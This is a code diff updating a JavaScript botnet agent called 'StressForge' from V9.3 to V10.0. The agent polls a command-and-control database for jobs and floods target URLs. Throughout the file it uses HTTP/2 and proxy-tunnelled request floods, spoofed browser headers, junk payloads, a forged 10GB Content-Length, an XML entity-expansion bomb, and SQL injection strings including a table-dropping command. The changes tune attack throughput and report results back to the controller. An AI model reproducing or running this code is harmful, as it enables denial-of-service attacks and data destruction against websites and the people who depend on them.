@@ -1,7 +1,8 @@
 /**
- * STRESSFORGE BOTNET AGENT V9.3 (SWARM INTELLIGENCE)
- * - Feature: Self-Healing DB Writes (Fallback Mode)
- * - Feature: True Swarm (Joins RUNNING jobs)
+ * STRESSFORGE BOTNET AGENT V10.0 (OMNI-STRIKE)
+ * - Fix: Smart Feature Balancing (Prevents Self-Choking)
+ * - Fix: Ghost Proxy forced to HTTP/1.1 for reliability
+ * - Fix: Dynamic Payload Sizing (GoldenEye adjusts for Pulse Mode)
  * - Safety: Memory Governor (Max 2500 threads)
  */
 const https = require('https');
@@ -26,13 +27,15 @@ const USER_AGENTS = [
     "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
 ];
 const REFERERS = ["https://google.com", "https://bing.com", "https://twitter.com", "https://facebook.com"];
-const JUNK_DATA = 'x'.repeat(1024 * 10); 
+// Pre-calculate buffers to save CPU
+const JUNK_DATA_LARGE = Buffer.alloc(1024 * 50, 'x'); // 50KB for Standard GoldenEye
+const JUNK_DATA_SMALL = Buffer.alloc(1024 * 1, 'x');  // 1KB for Pulse Mode (Speed optimized)
 const XML_BOMB = '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>';
 const SQL_PAYLOADS = ["' OR 1=1 --", "UNION SELECT 1, SLEEP(10) --", "'; DROP TABLE users; --", "admin' --"];
 
 // --- KEEPALIVE SERVER ---
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V9.3 ACTIVE'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V10.0 ACTIVE'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // --- HELPER: NATIVE SUPABASE ---
@@ -70,7 +73,7 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[35m[AGENT] Initialized V9.3 (Swarm). Polling C2...\x1b[0m');
+console.log('\x1b[35m[AGENT] Initialized V10.0 (Omni-Strike). Polling C2...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
@@ -95,12 +98,16 @@ const startAttack = (job) => {
     let targetUrl;
     try { targetUrl = new URL(job.target); } catch(e) { return; }
     
+    // CONFLICT RESOLUTION: Disable HTTP/2 if Ghost Proxy is active (Simpler tunneling)
+    const useH2 = job.use_http2 && targetUrl.protocol === 'https:' && !job.use_ghost_proxy;
+
     // HTTP/2 SESSION (Turbo)
     let h2Session = null;
-    if (job.use_http2 && targetUrl.protocol === 'https:' && !job.use_ghost_proxy) {
+    if (useH2) {
         try {
             h2Session = http2.connect(targetUrl.origin);
             h2Session.on('error', () => { h2Session = null; });
+            h2Session.setMaxListeners(0);
         } catch(e) {}
     }
 
@@ -117,14 +124,15 @@ const startAttack = (job) => {
         currentHeaders['Sec-Ch-Ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
         currentHeaders['Upgrade-Insecure-Requests'] = '1';
 
-        // --- 2. PAYLOAD CONSTRUCTION ---
+        // --- 2. PAYLOAD OPTIMIZATION (Prevent Choking) ---
         let payload = job.body;
         if (job.use_xml_bomb) {
             payload = XML_BOMB;
             currentHeaders['Content-Type'] = 'application/xml';
         } else if (job.use_goldeneye) {
             currentHeaders['X-Heavy-Load'] = 'true';
-            payload = JUNK_DATA;
+            // OPTIMIZATION: Use smaller payload if Pulse Mode is active to prevent bandwidth choking
+            payload = job.use_pulse ? JUNK_DATA_SMALL : JUNK_DATA_LARGE;
         } else if (job.use_big_bang) {
              currentHeaders['Content-Length'] = '10737418240'; 
         }
@@ -159,8 +167,11 @@ const startAttack = (job) => {
         const handleResponse = (res) => {
             const lat = Date.now() - start;
             jobLatencySum += lat; jobReqsForLatency++; jobMaxLatency = Math.max(jobMaxLatency, lat);
+            // Treat 3xx redirects as success in attack mode
             if (res.statusCode >= 200 && res.statusCode < 400) jobSuccess++; else jobFailed++;
-            if (res.resume) res.resume();
+            // Drain data to free memory
+            res.on('data', () => {}); 
+            res.on('end', () => {});
             totalRequests++;
             if (running && !job.use_pulse) setImmediate(performRequest);
         };
@@ -168,6 +179,7 @@ const startAttack = (job) => {
         const handleError = () => {
              jobFailed++; totalRequests++; 
              if (job.use_infinity && running) {
+                 // Retry 3x immediately
                  setImmediate(performRequest); setImmediate(performRequest); setImmediate(performRequest);
              } else if (running && !job.use_pulse) {
                  setImmediate(performRequest); 
@@ -192,14 +204,14 @@ const startAttack = (job) => {
                          createConnection: () => secureSocket
                      }, handleResponse);
                      req.on('error', handleError);
-                     if (payload && !job.use_big_bang) req.write(typeof payload === 'string' ? payload : JSON.stringify(payload));
+                     if (payload && !job.use_big_bang) req.write(payload);
                      if (!job.use_big_bang) req.end(); 
                  });
                  secureSocket.on('error', handleError);
              });
              tunnelReq.on('error', handleError);
              tunnelReq.end();
-        } else if (job.use_http2 && h2Session && !h2Session.destroyed) {
+        } else if (useH2 && h2Session && !h2Session.destroyed) {
             const req = h2Session.request({ ':path': vortexUrlObj.pathname + vortexUrlObj.search, ':method': job.method || 'GET', ...currentHeaders });
             req.on('response', (headers) => {
                 const lat = Date.now() - start;
@@ -209,7 +221,7 @@ const startAttack = (job) => {
                 totalRequests++;
             });
             req.on('error', handleError);
-            if (payload && !job.use_big_bang) req.write(typeof payload === 'string' ? payload : JSON.stringify(payload));
+            if (payload && !job.use_big_bang) req.write(payload);
             req.end();
             if (running && !job.use_pulse) setImmediate(performRequest);
         } else {
@@ -217,13 +229,19 @@ const startAttack = (job) => {
              const req = lib.request(vortexUrlObj, { agent, method: job.method || 'GET', headers: currentHeaders, timeout: 5000 }, handleResponse);
              req.on('socket', (s) => s.setNoDelay(true)); 
              req.on('error', handleError);
-             if (payload && !job.use_big_bang) try { req.write(typeof payload === 'string' ? payload : JSON.stringify(payload)); } catch(e) {}
+             if (payload && !job.use_big_bang) try { req.write(payload); } catch(e) {}
              if (!job.use_big_bang) req.end();
         }
     };
 
     if (job.use_pulse) {
-        const pulseLoop = setInterval(() => { if (!running) return clearInterval(pulseLoop); for(let i=0; i<500; i++) performRequest(); }, 100);
+        // Pulse Mode: Fire bursts every 100ms
+        const pulseLoop = setInterval(() => { 
+            if (!running) return clearInterval(pulseLoop); 
+            // Reduce burst size to 100 if Heavy features are on to prevent choke
+            const burstSize = (job.use_goldeneye || job.use_xml_bomb) ? 100 : 500;
+            for(let i=0; i<burstSize; i++) performRequest(); 
+        }, 100);
     } else {
         for(let i=0; i<job.concurrency; i++) performRequest();
     }
@@ -233,22 +251,25 @@ const startAttack = (job) => {
         const rps = Math.floor(totalRequests / elapsed) || 0;
         const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
         
+        // Memory Protection
         const used = process.memoryUsage().heapUsed / 1024 / 1024;
         if (used > 400 && global.gc) global.gc();
 
-        // SELF-HEALING DB WRITE
+        // SELF-HEALING DB WRITE (Legacy Fallback)
+        const statsPayload = { 
+             current_rps: rps,
+             total_success: jobSuccess,
+             total_failed: jobFailed,
+             avg_latency: avgLat,
+             max_latency: jobMaxLatency 
+        };
+        
         try {
-             await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { 
-                 current_rps: rps,
-                 total_success: jobSuccess,
-                 total_failed: jobFailed,
-                 avg_latency: avgLat,
-                 max_latency: jobMaxLatency 
-             });
+             await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, statsPayload);
         } catch(e) { 
             console.log(`[DB ERROR] ${e.message}`);
-            // Fallback: If full stats fail (schema mismatch), try sending just RPS
             try {
+                // Fallback: If DB schema is old, send minimal stats
                 await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { current_rps: rps });
             } catch(e2) { }
         }
